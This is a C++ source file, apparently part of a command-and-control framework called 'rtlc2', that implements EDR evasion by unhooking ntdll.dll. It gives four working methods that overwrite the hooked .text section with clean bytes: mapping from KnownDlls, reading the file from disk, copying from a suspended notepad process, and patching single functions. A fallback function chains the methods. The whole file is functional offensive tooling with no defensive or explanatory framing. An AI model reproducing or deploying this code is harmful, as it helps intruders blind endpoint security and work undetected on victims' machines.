// NTDLL Unhooking - Replace hooked ntdll with clean copy - Windows only
// EDR products hook ntdll functions; we restore .text from a clean source
#include "evasion.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <winternl.h>
#include <cstring>
#include <cstdio>

namespace rtlc2 {
namespace evasion {

// Helper: find .text section in PE image
struct TextSectionInfo {
    DWORD rva;
    DWORD virtualSize;
    DWORD rawOffset;
    DWORD rawSize;
    bool found;
};

static TextSectionInfo FindTextSection(BYTE* peBase) {
    TextSectionInfo info = {};
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return info;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(peBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return info;

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((const char*)section[i].Name, ".text") == 0) {
            info.rva = section[i].VirtualAddress;
            info.virtualSize = section[i].Misc.VirtualSize;
            info.rawOffset = section[i].PointerToRawData;
            info.rawSize = section[i].SizeOfRawData;
            info.found = true;
            return info;
        }
    }
    return info;
}

// Technique 1: Map fresh ntdll from KnownDlls
bool UnhookNtdllFromKnownDlls() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    typedef NTSTATUS(NTAPI* pNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR,
        SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
    typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

    auto NtOpenSec = (pNtOpenSection)GetProcAddress(hNtdll, "NtOpenSection");
    auto NtMapView = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    auto NtUnmapView = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtOpenSec || !NtMapView || !NtUnmapView) return false;

    UNICODE_STRING secName;
    secName.Buffer = (PWSTR)L"\\KnownDlls\\ntdll.dll";
    secName.Length = (USHORT)(wcslen(secName.Buffer) * sizeof(WCHAR));
    secName.MaximumLength = secName.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &secName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hSection = NULL;
    if (NtOpenSec(&hSection, 0x0004 /*SECTION_MAP_READ*/, &objAttr) != 0)
        return false;

    PVOID cleanBase = NULL;
    SIZE_T viewSize = 0;
    if (NtMapView(hSection, GetCurrentProcess(), &cleanBase, 0, 0, NULL,
                  &viewSize, 1 /*ViewShare*/, 0, PAGE_READONLY) != 0) {
        CloseHandle(hSection);
        return false;
    }
    CloseHandle(hSection);

    TextSectionInfo loaded = FindTextSection((BYTE*)hNtdll);
    TextSectionInfo clean = FindTextSection((BYTE*)cleanBase);

    if (!loaded.found || !clean.found) {
        NtUnmapView(GetCurrentProcess(), cleanBase);
        return false;
    }

    DWORD copySize = loaded.virtualSize < clean.virtualSize ? loaded.virtualSize : clean.virtualSize;
    BYTE* loadedAddr = (BYTE*)hNtdll + loaded.rva;
    BYTE* cleanAddr = (BYTE*)cleanBase + clean.rva;

    DWORD oldProtect = 0;
    VirtualProtect(loadedAddr, copySize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(loadedAddr, cleanAddr, copySize);
    DWORD tmp = 0;
    VirtualProtect(loadedAddr, copySize, oldProtect, &tmp);

    NtUnmapView(GetCurrentProcess(), cleanBase);
    return true;
}

// Technique 2: Read fresh ntdll from disk
bool UnhookNtdllFromDisk() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    char ntdllPath[MAX_PATH];
    _snprintf(ntdllPath, MAX_PATH, "%s\\ntdll.dll", sysDir);

    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return false; }

    BYTE* fileBuf = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fileBuf) { CloseHandle(hFile); return false; }

    DWORD bytesRead = 0;
    ReadFile(hFile, fileBuf, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    if (bytesRead != fileSize) { VirtualFree(fileBuf, 0, MEM_RELEASE); return false; }

    TextSectionInfo loaded = FindTextSection((BYTE*)hNtdll);
    TextSectionInfo file = FindTextSection(fileBuf);

    if (!loaded.found || !file.found) { VirtualFree(fileBuf, 0, MEM_RELEASE); return false; }

    DWORD copySize = loaded.virtualSize < file.rawSize ? loaded.virtualSize : file.rawSize;
    BYTE* loadedAddr = (BYTE*)hNtdll + loaded.rva;
    BYTE* fileAddr = fileBuf + file.rawOffset;

    DWORD oldProtect = 0;
    VirtualProtect(loadedAddr, copySize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(loadedAddr, fileAddr, copySize);
    DWORD tmp = 0;
    VirtualProtect(loadedAddr, copySize, oldProtect, &tmp);

    VirtualFree(fileBuf, 0, MEM_RELEASE);
    return true;
}

// Technique 3: Read clean ntdll from suspended process
bool UnhookNtdllFromSuspendedProcess() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    TextSectionInfo loaded = FindTextSection((BYTE*)hNtdll);
    if (!loaded.found) return false;

    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    char targetExe[MAX_PATH];
    _snprintf(targetExe, MAX_PATH, "%s\\notepad.exe", sysDir);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessA(targetExe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return false;

    BYTE* childAddr = (BYTE*)hNtdll + loaded.rva;
    BYTE* cleanBuf = (BYTE*)VirtualAlloc(NULL, loaded.virtualSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!cleanBuf) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return false;
    }

    SIZE_T bytesRead = 0;
    ReadProcessMemory(pi.hProcess, childAddr, cleanBuf, loaded.virtualSize, &bytesRead);

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    if (bytesRead != loaded.virtualSize) { VirtualFree(cleanBuf, 0, MEM_RELEASE); return false; }

    BYTE* loadedAddr = (BYTE*)hNtdll + loaded.rva;
    DWORD oldProtect = 0;
    VirtualProtect(loadedAddr, loaded.virtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(loadedAddr, cleanBuf, loaded.virtualSize);
    DWORD tmp = 0;
    VirtualProtect(loadedAddr, loaded.virtualSize, oldProtect, &tmp);

    VirtualFree(cleanBuf, 0, MEM_RELEASE);
    return true;
}

// Technique 4: Per-function unhook
bool UnhookFunction(const char* functionName) {
    if (!functionName) return false;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    FARPROC pFunc = GetProcAddress(hNtdll, functionName);
    if (!pFunc) return false;

    // Read clean bytes from disk
    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    char path[MAX_PATH];
    _snprintf(path, MAX_PATH, "%s\\ntdll.dll", sysDir);

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return false;

    BYTE* fileBase = (BYTE*)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!fileBase) return false;

    // Find function RVA in export table
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fileBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(fileBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    WORD numSec = nt->FileHeader.NumberOfSections;

    auto rvaToRaw = [&](DWORD rva) -> DWORD {
        for (WORD i = 0; i < numSec; i++) {
            if (rva >= sections[i].VirtualAddress &&
                rva < sections[i].VirtualAddress + sections[i].Misc.VirtualSize)
                return sections[i].PointerToRawData + (rva - sections[i].VirtualAddress);
        }
        return 0;
    };

    DWORD exportRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(fileBase + rvaToRaw(exportRva));
    DWORD* nameRvas = (DWORD*)(fileBase + rvaToRaw(exports->AddressOfNames));
    WORD* ordinals = (WORD*)(fileBase + rvaToRaw(exports->AddressOfNameOrdinals));
    DWORD* funcRvas = (DWORD*)(fileBase + rvaToRaw(exports->AddressOfFunctions));

    DWORD funcRva = 0;
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        if (strcmp((const char*)(fileBase + rvaToRaw(nameRvas[i])), functionName) == 0) {
            funcRva = funcRvas[ordinals[i]];
            break;
        }
    }

    if (funcRva == 0) { UnmapViewOfFile(fileBase); return false; }

    DWORD funcRaw = rvaToRaw(funcRva);
    if (funcRaw == 0) { UnmapViewOfFile(fileBase); return false; }

    const size_t PATCH_SIZE = 16;
    BYTE cleanBytes[PATCH_SIZE];
    memcpy(cleanBytes, fileBase + funcRaw, PATCH_SIZE);
    UnmapViewOfFile(fileBase);

    BYTE* hookedAddr = (BYTE*)pFunc;
    DWORD oldProtect = 0;
    VirtualProtect(hookedAddr, PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(hookedAddr, cleanBytes, PATCH_SIZE);
    DWORD tmp = 0;
    VirtualProtect(hookedAddr, PATCH_SIZE, oldProtect, &tmp);

    return true;
}

// Master function
bool UnhookNtdll() {
    if (UnhookNtdllFromKnownDlls()) return true;
    if (UnhookNtdllFromDisk()) return true;
    if (UnhookNtdllFromSuspendedProcess()) return true;
    return false;
}

} // namespace evasion
} // namespace rtlc2

#endif // RTLC2_WINDOWS
